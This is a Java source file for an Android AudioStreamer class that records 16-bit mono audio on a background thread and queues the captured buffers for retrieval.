package my.app.Library;

import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.util.Log;


public class AudioStreamer {

	public final String TAG = "AudioStreamer";
	public boolean stop = false;

	public BlockingQueue<byte[]> bbq = new LinkedBlockingQueue<byte[]>();

	int frequency = 11025;
	int channelConfiguration = AudioFormat.CHANNEL_CONFIGURATION_MONO;
	int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;

	int bufferSizeRecorder;
	// int bufferSizePlayer;
	byte[] buffer;
	byte[] buff; // pour le methode directe
	AudioRecord audioRecord;
	// AudioTrack audioTrack;
	Thread threcord;
	Context ctx;
	int chan;

	public AudioStreamer(OnRecordPositionUpdateListener c, int source, int chan) {
		this.chan = chan;
		this.bufferSizeRecorder = AudioRecord.getMinBufferSize(this.frequency,
			this.channelConfiguration, this.audioEncoding);
		this.audioRecord = new AudioRecord(source, this.frequency, this.channelConfiguration,
			this.audioEncoding, this.bufferSizeRecorder);
		// audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC,
		// frequency, channelConfiguration, audioEncoding, bufferSizeRecorder);

		this.audioRecord.setPositionNotificationPeriod(512);
		this.audioRecord.setRecordPositionUpdateListener(c);

		// bufferSizePlayer = AudioTrack.getMinBufferSize(frequency,
		// channelConfiguration, audioEncoding);
		// audioTrack = new AudioTrack(AudioManager.STREAM_MUSIC,frequency,
		// channelConfiguration, audioEncoding, bufferSizePlayer,
		// AudioTrack.MODE_STREAM);

		this.threcord = new Thread(new Runnable() {
			public void run() {
				AudioStreamer.this.record();
			}
		});

	}

	public int getChannel() {
		return this.chan;
	}

	public byte[] getData() {
		// return buff;
		// ou
		try {
			if (!this.bbq.isEmpty())
				return this.bbq.take();
		} catch (final InterruptedException e) {}
		return null;
	}

	public void record() {
		try {
			if (this.audioRecord.getState() == AudioRecord.STATE_UNINITIALIZED) {
				Log.e(this.TAG, "Initialisation failed !");
				this.audioRecord.release();
				this.audioRecord = null;
				return;
			}

			this.buffer = new byte[this.bufferSizeRecorder];
			this.audioRecord.startRecording();

			while (!this.stop) {
				final int bufferReadResult = this.audioRecord.read(this.buffer, 0,
					this.bufferSizeRecorder);
				// soit bbq
				final byte[] tmp = new byte[bufferReadResult];
				System.arraycopy(this.buffer, 0, tmp, 0, bufferReadResult);
				this.bbq.add(tmp);
				// soit direct
				// buff = new byte[bufferReadResult];
				// System.arraycopy(buffer, 0, buff, 0, bufferReadResult);

			}

			this.audioRecord.stop();

		} catch (final Throwable t) {
			Log.e("AudioRecord", "Recording Failed");
		}

	}

	public void run() {
		Log.i(this.TAG, "Launch record thread");
		this.stop = false;
		this.threcord.start();
	}

	public void stop() {
		this.stop = true;
	}
}
